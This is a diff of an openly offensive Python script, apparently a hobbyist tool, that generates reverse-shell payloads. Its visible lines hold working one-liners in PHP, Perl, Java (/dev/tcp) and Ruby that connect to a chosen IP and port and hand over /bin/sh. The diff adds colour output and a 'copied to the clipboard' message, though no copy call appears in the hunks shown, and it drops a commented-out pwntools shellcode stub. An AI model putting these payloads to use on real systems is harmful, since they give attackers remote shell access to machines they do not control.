@@ -5,7 +5,7 @@ PS. This is my attempt at trying to make code as unreadable as possible
 """
 import netifaces as ni
 from colorama import Fore
-# from pwn import *
+import pyperclip
 
 type_of_payloads = ['Reverse Shell', 'Shellcode']
 
@@ -31,9 +31,10 @@ def rev_payload(ip: str, error: bool = False):
                 f"php -r '$sock=fsockopen(\"{ip}\",{str(port)});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", f"perl -e 'use Socket;$i=\"{ip}\";$p={str(port)};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))" + "{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                 f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{str(port)};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
                 f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{str(port)}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"]
-    print("============= Payload ===============")
+    print(Fore.MAGENTA + "============= Payload ===============")
     print(payloads[chosen_payload]) if chosen_payload < len(payload_types) else rev_payload(ip=ip, error=True)
-    
+    print("Payload copied to the clipboard")
+
 """The following function will let the user choose an interface
 
 :param error: Set to false by default and is used to print the error message
@@ -69,12 +70,6 @@ def choose_payload(error: bool = False):
     # Only call the function if the reverse shell payload is selected
     choose_interface() if chosen_type_of_payload == 0 else ""
 
-"""This function only generates like a shell payload, I understand very very very little about shellcode and thought this would be a good reason to learn
-"""
-# def shellcode():
-#     context(arch="amd64", os="linux")
-#     code = b''
-#     code += asm(shellcraft.sh())
 
 if __name__ == "__main__":
     main()
